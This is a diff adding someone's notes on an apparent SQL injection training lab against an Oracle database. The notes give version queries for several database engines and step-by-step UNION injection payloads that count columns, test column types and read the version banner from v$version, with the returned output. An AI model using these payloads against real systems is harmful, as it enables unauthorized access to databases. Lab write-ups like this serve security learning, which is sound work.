@@ -1,0 +1,41 @@
+LAB DESCRIPTION
+1. SQLi vuln in product category
+GOAL
+2. Display database version string
+3. Given : Oracle db
+
+PREREQUISITE
+
+1. Querying database type and version
+    a) Microsoft, MySQL :	SELECT @@version
+    b) Oracle :	SELECT * FROM v$version
+    c) PostgreSQL :	SELECT version() 
+    Eg: ' UNION SELECT version() --
+
+    given db is Oracle
+    Oracle query requires a FROM condition
+    eg: SELECT 'a', 'b' FROM DUAL
+    DUAL is a builtin table in Oracle
+
+ANALYSIS
+
+1. No of col 
+    a) ' UNION ORDER BY 1--
+    b) ' UNION ORDER BY 2--
+    c) ' UNION ORDER BY 3--
+        <internal server error>
+
+    no of col = 2
+2. check data type it is accepting  
+    a) ' UNION SELECT 'a', NULL FROM DUAL--
+    b) ' UNION SELECT NULL, 'a' FROM DUAL--
+    c) ' UNION SELECT 'a', 'a' FROM DUAL--
+        both col accepts string datatype 
+3. retreive the version string
+    a) ' UNION SELECT NULL, banner FROM v$version
+
+    CORE 11.2.0.2.0 Production
+    NLSRTL Version 11.2.0.2.0 - Production
+    Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+    PL/SQL Release 11.2.0.2.0 - Production
+    TNS for Linux: Version 11.2.0.2.0 - Production
